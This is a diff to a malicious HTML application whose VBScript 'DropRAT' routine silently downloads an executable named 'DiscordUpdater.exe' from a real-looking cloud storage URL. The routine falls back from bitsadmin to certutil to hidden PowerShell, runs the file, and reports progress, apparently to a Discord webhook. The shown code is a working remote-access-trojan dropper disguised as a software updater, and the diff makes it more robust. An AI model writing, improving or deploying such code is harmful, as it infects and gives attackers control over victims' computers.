@@ -1,4 +1,3 @@
-
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
@@ -145,26 +144,35 @@ End Sub
 
 ' --- DropRAT ---
 Sub DropRAT()
+    Dim dl:   dl   = "https://tvouyfmncjaujhkbvwjq.supabase.co/storage/v1/object/public/Trixie/Untitled%20folder/DiscordUpdater.exe"
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\DiscordUpdater.exe"
-    Dim dl: dl = "https://tvouyfmncjaujhkbvwjq.supabase.co/storage/v1/object/public/Trixie/Untitled%20folder/DiscordUpdater.exe"
-    
-    If fso.FileExists(temp) Then fso.DeleteFile temp
 
-    Call PostEmbed("ðŸ“¦ RAT Download", "Fetching payload...", 3447003)
+    If fso.FileExists(temp) Then fso.DeleteFile temp, True
 
-    ' Added -UseBasicParsing to prevent IE engine hang, and -Exec Bypass for execution policy
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -UseBasicParsing -Uri '" & dl & "' -OutFile '" & temp & "'""", 0, True
-    
-    If fso.FileExists(temp) Then
-        Call PostEmbed("ðŸš€ RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
-        
-        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%TEMP%")
-        sh.Run "cmd.exe /c start """" """ & temp & """", 0, False
-        
-        Call PostEmbed("âœ… RAT", "Payload executed successfully", 65280)
-    Else
-        Call PostEmbed("âŒ› RAT Error", "Download failed.", 16711680)
+    ' method 1 — bitsadmin
+    sh.Run "bitsadmin /transfer dl /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
+
+    ' method 2 — certutil fallback
+    If Not fso.FileExists(temp) Then
+        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
+
+    ' method 3 — powershell fallback
+    If Not fso.FileExists(temp) Then
+        sh.Run "powershell -NoP -NonI -W Hidden -Command ""(New-Object Net.WebClient).DownloadFile('" & dl & "','" & temp & "')""", 0, True
+    End If
+
+    If fso.FileExists(temp) Then
+        If fso.GetFile(temp).Size > 10000 Then
+            sh.Run Chr(34) & temp & Chr(34), 0, False
+            Call PostEmbed(":white_check_mark: RAT", "Executed successfully", 65280)
+        Else
+            Call PostEmbed(":x: RAT", "File too small, download corrupt", 16711680)
+        End If
+    Else
+        Call PostEmbed(":x: RAT", "All download methods failed", 16711680)
+    End If
+End Sub
 End Sub
 
 ' --- Sleep Functions ---
